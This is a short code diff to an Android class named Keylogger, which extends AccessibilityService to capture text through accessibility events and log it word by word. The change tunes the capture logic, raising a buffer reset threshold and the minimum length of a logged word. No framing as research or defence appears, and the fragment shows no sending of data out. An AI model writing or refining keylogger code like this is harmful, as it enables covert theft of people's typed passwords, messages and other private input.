@@ -8,7 +8,7 @@ import java.util.List;
 
 public class Keylogger extends AccessibilityService {
     private static final int MAX_BUFFER_SIZE = 1000; // May vary
-    private static final double RESET_THRESHOLD = 70.0; // May vary
+    private static final double RESET_THRESHOLD = 80.0; // May vary
     private static final long TIMEOUT_MS = 5000; // May vary
     private String previousText = "";
 
@@ -24,7 +24,7 @@ public class Keylogger extends AccessibilityService {
             }
             // Log the word when buffer resets
             if(isBufferReset(previousText, capturedString)){
-                if(previousText.length() > 1){
+                if(previousText.length() > 2){
                     toLogWords(previousText);
                 }
             }
